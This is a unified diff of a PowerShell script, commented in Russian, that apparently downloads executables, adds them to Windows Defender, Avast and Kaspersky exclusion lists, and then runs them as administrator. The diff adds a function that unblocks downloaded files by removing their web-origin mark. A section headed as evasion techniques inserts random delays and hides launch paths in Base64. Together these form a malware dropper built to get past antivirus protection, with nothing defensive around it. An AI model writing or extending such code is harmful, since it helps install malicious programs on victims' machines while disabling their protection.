@@ -4,21 +4,17 @@ function Add-To-WindowsDefender-Exclusion {
         [string]$filePath
     )
 
-    # Проверка, существует ли файл
     if (-Not (Test-Path -Path $filePath)) {
         Write-Warning "Файл $filePath не найден."
         return
     }
 
     try {
-        # Получаем текущие исключения
         $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
-        # Проверяем, уже добавлен ли файл в исключения
         if ($currentExclusions -contains $filePath) {
             Write-Output "Файл $filePath уже добавлен в исключения Windows Defender."
         } else {
-            # Добавляем файл в исключения
             Add-MpPreference -ExclusionPath $filePath
             Write-Output "Файл $filePath успешно добавлен в исключения Windows Defender."
         }
@@ -33,14 +29,12 @@ function Add-To-Avast-Exclusion {
         [string]$filePath
     )
 
-    # Проверка, существует ли файл
     if (-Not (Test-Path -Path $filePath)) {
         Write-Warning "Файл $filePath не найден."
         return
     }
 
     try {
-        # Проверяем, запущен ли Avast
         $avastProcess = Get-Process -Name avast -ErrorAction SilentlyContinue
         if ($avastProcess) {
             Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
@@ -59,14 +53,12 @@ function Add-To-Kaspersky-Exclusion {
         [string]$filePath
     )
 
-    # Проверка, существует ли файл
     if (-Not (Test-Path -Path $filePath)) {
         Write-Warning "Файл $filePath не найден."
         return
     }
 
     try {
-        # Проверяем, запущен ли Kaspersky
         $kasperskyProcess = Get-Process -Name avp -ErrorAction SilentlyContinue
         if ($kasperskyProcess) {
             Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
@@ -76,6 +68,19 @@ function Add-To-Kaspersky-Exclusion {
         }
     } catch {
         Write-Error "Ошибка при добавлении файла $filePath в исключения Kaspersky Antivirus: $_"
+    }
+}
+
+# Функция для разблокировки файлов
+function Unblock-FileIfBlocked {
+    param (
+        [string]$filePath
+    )
+    if (Get-Item $filePath -ErrorAction SilentlyContinue) {
+        Unblock-File -Path $filePath
+        Write-Output "Файл $filePath разблокирован."
+    } else {
+        Write-Warning "Файл $filePath не найден или доступ к нему ограничен."
     }
 }
 
@@ -98,6 +103,10 @@ try {
     Write-Error "Ошибка при загрузке файла 2.exe: $_"
 }
 
+# Разблокировка файлов перед исключениями
+Unblock-FileIfBlocked -filePath $file1
+Unblock-FileIfBlocked -filePath $file2
+
 # Добавление в исключения Windows Defender
 Add-To-WindowsDefender-Exclusion -filePath $file1
 Add-To-WindowsDefender-Exclusion -filePath $file2
@@ -111,7 +120,6 @@ Add-To-Kaspersky-Exclusion -filePath $file1
 Add-To-Kaspersky-Exclusion -filePath $file2
 
 # Эвазионные техники
-# Добавление случайных задержек
 Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
 
 # Обфускация путей
@@ -121,10 +129,9 @@ $obfuscatedPath2 = [System.Convert]::FromBase64String("QzpcMngueGV4ZQ==")
 $decodedPath1 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath1)
 $decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)
 
-# Запуск файлов с обфусцированными путями от имени администратора
 Start-Process -FilePath $decodedPath1 -Verb RunAs
 Start-Process -FilePath $decodedPath2 -Verb RunAs
 
-# Завершающий запуск для всех файлов
+# Завершающий запуск файлов с правами администратора
 Start-Process -FilePath $file1 -Verb RunAs
 Start-Process -FilePath $file2 -Verb RunAs
